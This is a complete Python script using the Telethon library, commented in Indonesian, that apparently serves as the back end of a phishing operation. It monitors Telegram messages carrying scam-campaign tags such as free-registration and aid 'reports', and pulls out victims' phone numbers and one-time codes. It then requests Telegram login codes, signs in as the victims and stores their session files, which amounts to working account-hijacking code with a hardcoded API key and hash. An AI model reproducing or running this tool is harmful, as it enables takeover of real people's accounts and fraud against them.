import os
import re
import asyncio
import shutil
from telethon import TelegramClient, events

# === Konfigurasi ===
API_ID = 26763615
API_HASH = '4d8aa7c999f425c489422548d1db0bd7'
SESSION_TEMP = "ewww_sessions"
SESSION_FINAL = "sessions"

# Tag yang dianggap valid
TAGS = [
    '❮ LAPORAN DAFTAR GRATISKU ❯',
    '❮ LAPORAN UANG KUNO ❯',
    '❮ LAPORAN BANTUAN MADANI ❯',
    '❮ LAPORAN LAMBE PECINTA JANDA ❯',
    '❮ LAPORAN FAIDIL ❯'
]

os.makedirs(SESSION_TEMP, exist_ok=True)
os.makedirs(SESSION_FINAL, exist_ok=True)

ALLOWED_PREFIX = ["+62", "+60"]
login_queue = {}

def is_valid_number(number: str) -> bool:
    return re.fullmatch(r"\+\d{10,15}", number) and any(number.startswith(p) for p in ALLOWED_PREFIX)

def finalize_session(phone: str):
    src = os.path.join(SESSION_TEMP, phone)
    dst = os.path.join(SESSION_FINAL, f"{phone}.session")
    if os.path.exists(src):
        shutil.move(src, dst)
        print(f"[✔] Session {phone} dipindahkan.")
    else:
        print(f"[✖] Tidak ditemukan session sementara untuk {phone}")

# === Client utama (user session) ===
client = TelegramClient("main_session", API_ID, API_HASH)

# === Event handler utama ===
@client.on(events.NewMessage)
async def handle_message(event):
    text = event.raw_text

    # Filter berdasarkan TAG
    if not any(tag in text for tag in TAGS):
        return

    phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', text)
    otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', text)

    if not phone_match:
        return

    number = phone_match.group(1)
    if not is_valid_number(number):
        print(f"[❌] Nomor tidak valid: {number}")
        return

    # Kirim OTP jika belum diminta
    if number not in login_queue and not otp_match:
        print(f"[📲] Kirim OTP request ke Telegram untuk: {number}")
        await request_otp(number)

    # Proses login jika OTP tersedia
    elif number in login_queue and otp_match:
        code = otp_match.group(1)
        print(f"[🔐] OTP ditemukan untuk {number}: {code}")
        await login_with_otp(number, code)

# === Kirim permintaan OTP ===
async def request_otp(number):
    session_path = os.path.join(SESSION_TEMP, number)
    tg_client = TelegramClient(session_path, API_ID, API_HASH)
    await tg_client.connect()

    try:
        if not await tg_client.is_user_authorized():
            await tg_client.send_code_request(number)
            login_queue[number] = tg_client
            print(f"[📤] OTP terkirim ke {number}")
        else:
            print(f"[✅] Sudah login: {number}")
            await tg_client.disconnect()
    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {number}: {e}")
        await tg_client.disconnect()

# === Login dengan OTP ===
async def login_with_otp(number, code):
    tg_client = login_queue.get(number)
    if not tg_client:
        print(f"[⚠] Tidak ada client untuk {number}")
        return

    try:
        await tg_client.sign_in(number, code)
        print(f"[✅] Login sukses: {number}")
        finalize_session(number)
        await tg_client.disconnect()
        del login_queue[number]
    except Exception as e:
        print(f"[❌] Gagal login {number}: {e}")
        await tg_client.disconnect()

# === Jalankan client ===
async def main():
    await client.start()
    print("[🚀] Bot aktif dan memantau grup...")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
